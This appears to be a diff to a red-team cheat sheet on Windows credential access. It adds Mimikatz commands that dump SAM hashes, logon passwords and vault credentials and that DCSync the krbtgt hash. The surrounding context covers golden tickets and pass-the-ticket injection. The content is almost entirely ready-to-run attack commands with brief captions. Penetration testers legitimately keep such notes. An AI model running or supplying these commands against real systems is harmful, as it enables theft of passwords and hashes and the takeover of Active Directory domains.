@@ -192,9 +192,16 @@ winPEASx64.exe
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
 ### Mimikatz 
-"privilege::debug" grants account SeDebugPrivilege
+"privilege::debug" grants account SeDebugPrivilege. Dumps Local Users
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
+```
+```powershell
+#Dump Logon Passwords
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+#Dump Windows Secrets
+vault::list
+vault::cred /patch
 ```
 Get krbtgt hash on a DC
 ```powershell
@@ -208,6 +215,10 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain>
 Inject Ticket
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
+```
+DCSync (need LDAP SPN)
+```powershell 
+lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com
 ```
 ## Lateral Movement
 All the PS remoting 
